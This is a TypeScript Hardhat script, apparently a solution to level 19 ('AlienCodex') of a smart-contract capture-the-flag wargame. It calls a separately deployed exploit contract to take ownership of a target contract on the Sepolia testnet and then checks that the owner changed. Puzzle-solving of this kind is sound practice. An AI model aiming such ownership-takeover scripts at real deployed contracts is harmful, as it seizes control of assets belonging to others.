import { ethers } from "hardhat";

/**
 * Execute the AlienCodex exploit to claim ownership of the AlienCodex contract
 * 
 * Usage:
 * ALIEN_CODEX_EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourAlienCodexAddress npx hardhat run scripts/level-19-alien-codex/execute-alien-codex-exploit.ts --network sepolia
 */
async function main() {
  console.log("Executing AlienCodex exploit...");
  
  // Get the addresses from environment
  const exploitAddress = process.env.ALIEN_CODEX_EXPLOIT_ADDRESS;
  const targetAddress = process.env.TARGET_ADDRESS;
  
  if (!exploitAddress) {
    throw new Error("Environment variable ALIEN_CODEX_EXPLOIT_ADDRESS must be set");
  }
  
  if (!targetAddress) {
    throw new Error("Environment variable TARGET_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  try {
    // Connect to the contracts
    const alienCodexExploit = await ethers.getContractAt("AlienCodexExploit", exploitAddress);
    const alienCodex = await ethers.getContractAt("AlienCodex", targetAddress);
    
    // Check current owner of the AlienCodex contract
    const originalOwner = await alienCodex.owner();
    console.log(`Current owner of AlienCodex: ${originalOwner}`);
    
    // Execute the exploit to claim ownership
    console.log(`Executing exploit to claim ownership for address ${signer.address}...`);
    const tx = await alienCodexExploit.exploit(signer.address);
    console.log("Transaction hash:", tx.hash);
    
    const receipt = await tx.wait();
    console.log("Transaction confirmed in block:", receipt?.blockNumber || 'unknown');
    
    // Verify ownership was transferred
    const newOwner = await alienCodex.owner();
    console.log(`New owner of AlienCodex: ${newOwner}`);
    
    if (newOwner.toLowerCase() === signer.address.toLowerCase()) {
      console.log("\n✅ Success! AlienCodex ownership claimed successfully.");
    } else {
      console.log("\n❌ Failed! Ownership was not transferred to your address.");
    }
  } catch (error) {
    console.error("Error executing AlienCodex exploit:", error);
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
